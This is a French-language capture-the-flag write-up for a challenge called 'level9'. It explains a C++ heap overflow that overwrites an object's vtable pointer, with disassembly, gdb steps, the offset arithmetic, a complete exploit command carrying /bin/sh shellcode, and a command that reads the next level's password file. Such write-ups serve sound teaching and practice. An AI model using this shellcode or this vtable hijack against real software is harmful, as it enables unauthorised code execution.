### Level 9

#### Etape 01 :

Le programme cree deux objets `a` et `b`. On identifie la faille dans le code source :

- `a->setAnnotation(argv[1])` copie les donnees sans verification de taille,
- cela permet un overflow depuis l'objet `a`, avec `a->annotation` qui est alloue juste avant `b`, vers la zone memoire de `b`, le debut de `b` contenant le pointeur vers la vtable.
- En ecrasant ce pointeur on controle ou le programme va chercher la fonction a appeler.

L'objectif est de corrompre la chaine d'appel de `operator+` pour rediriger l'execution vers un shellcode vu que le programme fait `*b + *a`, si on cree une fausse table, on redirige l,execution.

#### Etape 02 :

 `esp+0x10` contient le pointeur vers `b` car :

```text
0x08048639 <+69>:     call   0x8048530 <_Znwj@plt>
0x0804863e <+74>:     mov    %eax,%ebx
0x08048640 <+76>:     movl   $0x6,0x4(%esp)
0x08048648 <+84>:     mov    %ebx,(%esp)
0x0804864b <+87>:     call   0x80486f6 <_ZN1NC2Ei>
0x08048650 <+92>:     mov    %ebx,0x18(%esp)
...
0x0804865c <+104>:    mov    0x18(%esp),%eax
0x08048660 <+108>:    mov    %eax,0x10(%esp)
```

Resume :

- `_Znwj` (c'est du cpp mangle, on le verifie avec `c++filt`)  alloue de la memoire pour un objet N et retourne son adresse (pointeur) dans `eax`,
- l'adresse est copiee dans `ebx`. `this` = `ebx`
- Ensuite avec `movl` et `mov`, on prépare les arguments du constructeur (`this` dans `esp`, et `6` dans `esp+4`)
- Puis on appelle le constructeur (`N(this,6)`) avec  `call 0x80486f6 <_ZN1NC2Ei>`. Après l’appel, `ebx` contient donc un objet N initialisé avec la valeur 6, ce qui correspond à `b`.
- Ce pointeur est ensuite stocké dans `esp+0x18` et recopiee dans `esp+0x10`.
- Conclusion `esp+0x10` contient `b`.

#### Etape 03 :

Le shellcode utilise est :

```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Apres `setAnnotation`, on observe en assembleur :

```text
0x0804867c <+136>:    mov    0x10(%esp),%eax
0x08048680 <+140>:    mov    (%eax),%eax
0x08048682 <+142>:    mov    (%eax),%edx
...
0x08048693 <+159>:    call   *%edx
```
Ici on a recuperation de l'obejt `b` -> il lit le debut de `b`, pointeur vers vtable -> il lit la premiere entree, une adresse de fonction -> saute a l'adresse et execute.
Ce passage montre une double dereference pour acceder a la fonction operator+()  :

- `eax = b`
- `eax = *b`
- `edx = **b`

Il faut donc forger une structure en memoire telle que `b` pointe vers notre buffer, puis que ce buffer pointe vers le shellcode.


#### Etape 04 :

On cherche l'adresse de debut de notre buffer :
0x08048000 : début typique de la région exécutable .text et +
l'autre est arbitraire on le fait petit a petit 
```text
(gdb) run $(python -c 'print "eeee" * 50')
(gdb) find 0x08048000, 0x09000000, 0x65656565
```

Resultat :

```text
0x804a00c
0x804a00d
0x804a00e
0x804a00f
0x804a010
...
```

On retient `0x804a00c` comme debut du buffer.

#### Etape 05 :

Il faut trouver l'offset pour atteindre `*b`. Nous allons nous appuyer sur esp+0x10 pour voir quand nous ecrivons dans *b :

```text
(gdb) run $(python -c 'print "e" * 111')
(gdb) x/x $esp+0x10
0xbffff6b0:  0x0804a078
(gdb) x/x 0x0804a078
0x804a078:   0x08656565
```

`esp+0x10` contient le pointeur vers `b` : `0x0804a078`
a `0x0804a078` on a `0x08656565` qui est l'objet `b` ecrase avec le pointeur vers vtable au debut de l'objet qui est ecrase.

On voit que 3 octets de `*b` sont ecrits avec 111 octets envoyes, donc :

- offset = `111 - 3 = 108`

Construction du payload :

- partie 1 : creation du faux pointeur, `buffer(0x804a00c) + 4` (`0x804a010`) c'est vers ou le shellcode commence vraiment,
- partie 2 : shellcode,
- partie 3 : padding,
- partie 4 : pointeur vers le buffer (`0x804a00c`) pour rediriger `b`.

#### Etape 06 :

Execution de l'exploit :

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "e" * 76 + "\x0c\xa0\x04\x08"')
```

On obtient un shell, puis on recupere le mot de passe du niveau suivant :

```bash
cat /home/user/bonus0/.pass
```

